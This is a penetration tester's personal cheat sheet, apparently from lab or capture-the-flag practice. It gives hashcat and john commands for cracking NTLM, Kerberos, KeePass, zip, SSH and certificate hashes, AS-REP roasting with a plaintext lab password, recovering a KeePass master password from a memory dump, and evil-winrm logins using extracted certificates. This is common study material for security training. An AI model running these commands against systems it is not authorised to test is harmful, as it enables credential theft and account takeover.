Look up hash type here https://hashcat.net/wiki/doku.php?id=example_hashes

Can use john to figure out hash type automatically:
```
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash.txt
```

NTLM w hashcat
```
hashcat -m 1000 hash_admin.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

NTLMv2 w hashcat
```
hashcat -m 5600 -a 0 -o cracked.txt --force hash_147.txt /usr/share/wordlists/rockyou.txt
```

Database.kdbx w hashcat
`Keepass2john Database.kdbx > keepass.hash`
- remove "Database:" from beginning of hash, or whatever the filename: of the kdbx is
```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
or
```
john keepass.hash -w:/usr/share/wordlists/rockyou.txt
```
can also open kdbx with kpcli if you have password
```
kpcli --kdb passwords.kdbx
```
- or can just run `kpcli` and once in kpcli run `open passwords.kdbx` and it will ask for the password
- from there `ls` and `cd` through the groups until you see an entry. to see info:
	- `show -f 0` for entry 0
	- `show -f 1` for entry 1


Keepass .dmp file
```
python keepass_dump.py -f KeePassDumpFull.dmp
```
- from https://github.com/z-jxy/keepass_dump
- will extract as many letters from the keepass master password as it can find
- try googling the rest to fill in the blanks


Converting putty key to openssh
- copy everything starting with "PuTTY-User-Key-File-3: ssh-rsa" and the whole key into a file named `root-putty.key`
	- remove all spaces before each line in vim `%s/^\s\+//`
```
puttygen root-putty.key -O private-openssh -o keeper-root
```
- then ssh with key:
```
ssh -i keeper-root root@10.129.215.139
```


asrep roast w hashcat
`proxychains -q impacket-GetNPUsers -dc-ip 172.16.145.6 -request -outputfile hashes.asreproast relia.com/jim:"Castello1\!"`
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

zip with john
`zip2john sitebackup3.zip > zip3.hash`
```
john --wordlist=/usr/share/wordlists/rockyou.txt zip3.hash
```
`john zip3.hash --show`

ssh with john
`ssh2john id_ecdsa > anita.hash`
```
john --wordlist=/usr/share/wordlists/rockyou.txt anita.hash
```
`ssh -i ./id_ecdsa anita@192.168.164.245 -p 2222`

pfx2john
```
pfx2john legacyy_dev_auth.pfx > pfx.hash
```
crack it
```
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
```

pem2john
```
pem2john ./privkey.pem > hash.txt
```
crack it
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

use password to extract keys and certificate
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
```
- it will ask for password and PEM pass phrase (make up pass phrase here: 4+ characters)
decrypt password:
```
openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth_decoded.key
```
dump the certificate:
```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```
connect with key and cert:
```
evil-winrm -i 10.129.98.245 -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```


Password generating
```
crunch 6 6 -t Lab%%% > wordlist
```
- minimum and maximum length to 6 characters
- specify the pattern using the -t parameter
- then hard-code the first three characters to 'Lab' followed by three numeric digits

Kerberoasting
- ex: $krb5tgs hash from GetUsersSPNs.py
```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
- use https://hashcat.net/wiki/doku.php?id=example_hashes to search hash types
- in vim
	- `:%s/\s\+//g`
		- removes all spaces
	- `:%s/\n//g`
		- joins all lines to a single line

create a sub-wordlist from rockyou containing all words with ninja:
```
grep -i ninja /usr/share/wordlists/rockyou.txt > rockyou_ninja
```
- useful if there's a hint at what the password is, speed up cracking